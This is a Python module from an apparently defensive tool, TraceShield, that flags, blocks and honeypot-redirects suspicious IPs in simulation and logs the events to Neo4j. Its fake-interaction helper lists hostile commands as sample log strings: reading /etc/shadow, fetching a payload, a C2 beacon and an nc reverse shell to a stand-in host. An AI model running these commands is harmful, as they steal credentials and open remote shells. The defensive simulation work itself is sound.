"""
response_engine.py — Automated response mechanism for TraceShield.

Actions by risk level:
    NORMAL    → no action
    SUSPICIOUS → flag and monitor
    HIGH_RISK  → block IP + redirect to honeypot

All actions are simulated (no real network blocking).
State is maintained in-memory for the lifetime of the process.
"""

import logging
import random
import string
from datetime import datetime
from typing import Dict, Set

from ingestion.db.neo4j_conn import get_driver

logger = logging.getLogger(__name__)

# ── In-memory state ───────────────────────────────────────────────────────────

_blocked_ips:    Set[str]        = set()
_honeypot_ips:   Set[str]        = set()
_flagged_ips:    Dict[str, int]  = {}   # ip → flag count


def is_blocked(ip: str) -> bool:
    return ip in _blocked_ips


def get_state(ip: str) -> dict:
    return {
        "blocked":             ip in _blocked_ips,
        "redirected_honeypot": ip in _honeypot_ips,
        "flag_count":          _flagged_ips.get(ip, 0),
    }


# ── Response actions ──────────────────────────────────────────────────────────

def _flag_ip(ip: str, reason: str) -> None:
    _flagged_ips[ip] = _flagged_ips.get(ip, 0) + 1
    logger.warning("FLAGGED | ip=%s reason=%s flag_count=%d",
                   ip, reason, _flagged_ips[ip])


def _block_ip(ip: str, reason: str) -> None:
    if ip not in _blocked_ips:
        _blocked_ips.add(ip)
        logger.warning("IP BLOCKED | ip=%s reason=%s [SIMULATED]", ip, reason)
        _store_block_in_neo4j(ip, reason)
    else:
        logger.info("IP already blocked | ip=%s", ip)


def _redirect_to_honeypot(ip: str, reason: str) -> None:
    if ip not in _honeypot_ips:
        _honeypot_ips.add(ip)
        honeypot_id = "honeypot_" + "".join(random.choices(string.ascii_lowercase, k=6))
        fake_log = _generate_fake_interaction(ip, honeypot_id)
        logger.warning(
            "REDIRECTED TO HONEYPOT | ip=%s honeypot=%s reason=%s [SIMULATED]",
            ip, honeypot_id, reason
        )
        _store_honeypot_in_neo4j(ip, honeypot_id, fake_log)
    else:
        logger.info("IP already in honeypot | ip=%s", ip)


def _generate_fake_interaction(ip: str, honeypot_id: str) -> dict:
    """Simulate a fake honeypot interaction log."""
    commands = [
        "ls -la /etc/passwd",
        "cat /etc/shadow",
        "wget http://malicious.example.com/payload.sh",
        "curl -s http://c2.example.com/beacon",
        "nc -e /bin/bash 10.0.0.1 4444",
    ]
    return {
        "honeypot_id":  honeypot_id,
        "attacker_ip":  ip,
        "timestamp":    datetime.utcnow().isoformat(),
        "fake_command": random.choice(commands),
        "session_id":   "sess_" + "".join(random.choices(string.hexdigits[:16], k=8)),
    }


# ── Neo4j persistence ─────────────────────────────────────────────────────────

def _store_block_in_neo4j(ip: str, reason: str) -> None:
    driver = get_driver()
    if not driver:
        return
    try:
        with driver.session() as s:
            s.run(
                "MERGE (i:IP {address: $ip}) "
                "MERGE (sys:System {name: 'TraceShield'}) "
                "CREATE (i)-[:BLOCKED {reason: $reason, timestamp: $ts}]->(sys)",
                ip=ip, reason=reason, ts=datetime.utcnow().isoformat()
            )
        logger.info("Neo4j: BLOCKED relationship stored for ip=%s", ip)
    except Exception as e:
        logger.warning("Neo4j block store failed: %s", e)


def _store_honeypot_in_neo4j(ip: str, honeypot_id: str, fake_log: dict) -> None:
    driver = get_driver()
    if not driver:
        return
    try:
        with driver.session() as s:
            s.run(
                "MERGE (i:IP {address: $ip}) "
                "MERGE (h:Honeypot {name: $hid}) "
                "CREATE (i)-[:REDIRECTED_TO {"
                "  timestamp: $ts, "
                "  fake_command: $cmd, "
                "  session_id: $sid"
                "}]->(h)",
                ip=ip, hid=honeypot_id,
                ts=fake_log["timestamp"],
                cmd=fake_log["fake_command"],
                sid=fake_log["session_id"],
            )
        logger.info("Neo4j: REDIRECTED_TO honeypot stored for ip=%s", ip)
    except Exception as e:
        logger.warning("Neo4j honeypot store failed: %s", e)


# ── Main dispatcher ───────────────────────────────────────────────────────────

def execute_response(ip: str, status: str, components: dict) -> dict:
    """
    Execute automated response based on risk classification.

    Args:
        ip:         Source IP address.
        status:     NORMAL | SUSPICIOUS | HIGH_RISK
        components: Score breakdown dict for reason extraction.

    Returns:
        Dict describing actions taken.
    """
    reason = _build_reason(components)
    actions_taken = []

    if status == "NORMAL":
        pass  # no action

    elif status == "SUSPICIOUS":
        _flag_ip(ip, reason)
        actions_taken.append("flagged")

    elif status == "HIGH_RISK":
        _block_ip(ip, reason)
        _redirect_to_honeypot(ip, reason)
        actions_taken.extend(["blocked", "redirected_to_honeypot"])

    state = get_state(ip)
    return {
        "actions_taken":          actions_taken,
        "blocked":                state["blocked"],
        "redirected_to_honeypot": state["redirected_honeypot"],
        "flag_count":             state["flag_count"],
        "reason":                 reason,
    }


def _build_reason(components: dict) -> str:
    parts = []
    if components.get("spike_score", 0) > 70:
        parts.append(f"spike={components['spike_score']:.1f}")
    if components.get("trend_score", 0) > 60:
        parts.append(f"trend={components['trend_score']:.1f}")
    if components.get("ml_score", 0) >= 60:
        parts.append(f"ml_anomaly={components['ml_score']:.1f}")
    if components.get("temporal_score", 0) >= 50:
        parts.append(f"high_rate={components['temporal_score']:.1f}")
    return "+".join(parts) if parts else "combined_score"
